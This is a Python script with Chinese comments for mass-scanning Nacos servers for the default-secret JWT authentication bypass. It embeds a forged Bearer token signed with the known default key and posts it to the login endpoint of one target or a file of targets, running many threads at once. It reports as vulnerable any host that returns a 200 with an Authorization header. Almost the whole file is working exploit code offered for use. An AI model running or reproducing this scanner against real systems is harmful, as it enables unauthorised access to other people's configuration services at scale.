# -*- coding: utf-8 -*-
from urllib.parse import urlsplit
import argparse
import requests
import sys
import re
import signal
import threading
from requests.exceptions import RequestException

jwt_token_str="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDY3ODk3MDQyM30.lnslDXAElX0J_STPpWmBOmiQaVcU3eK3F7McFehD_6I"

# 自定义请求头字段
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "Authorization": "Bearer "+jwt_token_str
}

data = {
    "username":"nacos",
    "password":"testtest"
    }

#url合规检测执行
def urltest(url):
    parsed_url = urlsplit(url)
    if parsed_url.netloc and parsed_url.path:
        url=parsed_url.scheme+"://"+parsed_url.netloc+"/nacos/v1/auth/users/login"
        vultest(url)
    elif parsed_url.netloc:
        url=url+"/nacos/v1/auth/users/login"
        vultest(url)
    elif (not parsed_url.scheme) and parsed_url.path:
        url_1="http://"+url+"/nacos/v1/auth/users/login"
        vultest(url_1)
        url_2="https://"+url+"/nacos/v1/auth/users/login"
        vultest(url_2)
    else:
        modified_string = re.sub(r"[/\\].*", "/nacos/v1/auth/users/login", url)
        url_1="http://"+modified_string
        vultest(url_1)
        url_2="https://"+modified_string
        vultest(url_2)

#漏洞检测
def vultest(url):
    try:
        response = requests.post(url, data=data, headers=headers, verify=False , timeout=3)
        # 检查响应头的状态码是否为200
        if response.status_code == 200 and ("Authorization" in response.headers):
            print(url+"  [+]漏洞存在！！！")
        else:
            print(url+"  [-]漏洞不存在。")
    except RequestException:
        print(url+"  [-]请求失败。")


#读取url或file
def main():
    parser = argparse.ArgumentParser(description="读取命令行参数")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='URL 参数')
    group.add_argument('-f', '--file', help='file 参数')
    args = parser.parse_args()
    if args.url:
        urltest(args.url)
    elif args.file:
        threads_queue=[]
        with open(args.file, 'r') as file:
            for line in file:
                line=line.strip()
                read_thread = threading.Thread(target=urltest, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

if __name__ == "__main__":
    main()
